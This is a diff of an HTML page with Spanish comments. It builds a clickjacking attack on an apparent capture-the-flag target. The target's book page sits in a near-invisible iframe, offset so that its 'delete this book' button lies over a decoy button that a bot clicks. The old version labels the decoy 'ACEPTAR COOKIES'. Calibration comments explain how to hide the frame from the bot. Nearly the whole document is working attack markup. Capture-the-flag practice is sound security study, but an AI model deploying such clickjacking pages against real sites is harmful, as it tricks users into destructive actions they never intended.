@@ -2,54 +2,41 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Soporte Técnico</title>
     <style>
-        /* Eliminamos cualquier margen para que las coordenadas sean exactas */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: white; }
-
-        /* El BOTÓN que el bot busca. 
-           Lo vamos a hacer gigante para que sea imposible no darle. */
+        /* El botón que el bot busca por ID */
         #objetivo {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            border: none;
-            background: transparent;
-            z-index: 10; /* Arriba del todo */
-            cursor: pointer;
+            top: 300px; /* Posición estándar de clic de bot */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 300px;
+            height: 100px;
+            z-index: 1;
+            opacity: 0.1; /* Un poco visible para que veas dónde está */
         }
 
-        /* El IFRAME de la librería. 
-           Estará DEBAJO del botón, pero con una propiedad de CSS
-           que permite que el clic traspase el botón y le pegue al iframe. */
-        #victim-frame {
+        /* El iframe con la página del libro */
+        iframe {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 2000px;
+            height: 1000px;
             border: none;
-            z-index: 100;
-            /* CALIBRACIÓN: Ajusta el margin-top para que el botón de borrar 
-               esté en la parte superior de la pantalla del bot */
-            margin-top: -760px; 
-            opacity: 0.0001; /* CAMBIA A 0.001 DESPUÉS DE CALIBRAR */
-        }
-
-        /* Bloqueamos que el botón detecte el clic para que pase al fondo */
-        #objetivo {
-            pointer-events: none;
+            z-index: 2;
+            /* CALIBRACIÓN CRÍTICA */
+            /* Este valor debe subir la página hasta que el botón gris 
+               de "Borrar este libro" tape a tu botón rojo */
+            margin-top: -730px; 
+            opacity: 0.5; /* CAMBIA A 0 PARA EL BOT */
         }
     </style>
 </head>
 <body>
 
-    <button id="objetivo">ACEPTAR COOKIES</button>
+    <button id="objetivo">CLICK ME</button>
 
-    <iframe id="victim-frame" src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
+    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
 
 </body>
 </html>
